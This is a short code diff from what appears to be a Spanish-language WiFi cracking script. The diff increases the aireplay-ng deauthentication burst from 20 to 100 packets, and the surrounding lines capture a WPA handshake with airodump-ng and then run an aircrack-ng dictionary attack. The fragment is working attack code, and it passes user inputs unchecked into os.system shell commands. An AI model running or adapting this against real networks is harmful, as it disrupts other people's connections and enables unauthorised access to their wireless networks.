@@ -150,7 +150,7 @@ def dicD():
 def start():
 		logo()
 		print(B+"[*] "+GRs+"Iniciando ataque...esperando respuesta y luego desencriptar")
-		os.system("xterm -geometry 132x26 -e sudo airodump-ng -c "+channel.get()+" -w "+wname.get()+" --bssid "+bssid.get()+" "+iface.get()+" | xterm -geometry 132x16 -e sudo aireplay-ng --deauth 20 -a "+client.get()+" "+iface.get())
+		os.system("xterm -geometry 132x26 -e sudo airodump-ng -c "+channel.get()+" -w "+wname.get()+" --bssid "+bssid.get()+" "+iface.get()+" | xterm -geometry 132x16 -e sudo aireplay-ng --deauth 100 -a "+client.get()+" "+iface.get())
 		desea=input(C+"Desea ahora atacar con diccionario?[S/n]")
 		if desea == "S" or desea == "s":
 			os.system("sudo aircrack-ng -w "+dic.get()+" '"+wname.get()+"'")
